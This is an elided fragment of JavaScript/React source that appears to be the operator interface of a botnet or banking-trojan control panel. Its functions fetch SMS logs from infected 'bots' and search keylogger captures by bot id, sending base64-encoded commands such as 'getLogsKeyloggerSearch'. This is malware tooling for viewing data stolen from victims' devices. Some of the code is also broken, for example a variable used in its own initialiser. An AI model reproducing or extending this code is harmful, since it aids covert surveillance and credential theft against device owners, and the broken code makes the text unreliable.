 ...
 */
    ...
    ParseResult(resultJSON) {
        ...
        if(this.state.stateCMD === 'getLogsBotsSmsSaved') {
            ...
            MyLogsArr = [...MyLogsArr, resultJSON.map(function(element) {
                return <p class="debug">{element}</p>;
            }.bind(this))];
            /*
            resultJSON.forEach(function(element) {
    ...
    search() {
        if (this.state.searchText == '') {
            ...
            let request = $.ajax({
                ...
                data: {
                    'params': new Buffer(
                        '{"request":"getLogsKeyloggerSearch","idbot":"' + SettingsContext.CurrentSetBot + '","searchtext":"' + this.state.searchText + '"}'
                    ).toString('base64')
                }
            });
            ...
            request.done(function(msg) {
                try {
                    let result = JSON.parse(msg);
                    let asd = [...asd, result.map(function(element) {
                        return <p class="debug">{element}</p>;
                    }.bind(this))];
                    this.setState({
                        ResultOnLog: asd
                    ...
                    SettingsContext.ShowToastTitle('error', 'ERROR', 'Error send bot cmd getLogsKeyloggerSearch. Look console for more details.');
                    console.log('Error - ' + ErrMgs);
                }
            }.bind(this));
        }
            ...
            <table style={({width:'100%'})}>
                <tr>
                    <td style={({width:'50%'})}>
                        ...
                        <i className="fas fa-search" data-placement="bottom" data-toggle="tooltip" title="Search"
                           onClick={this.search.bind(this)} style={({marginLeft: '10px'})}></i>
                    </td>
                    <td style={({width:'50%'})}>
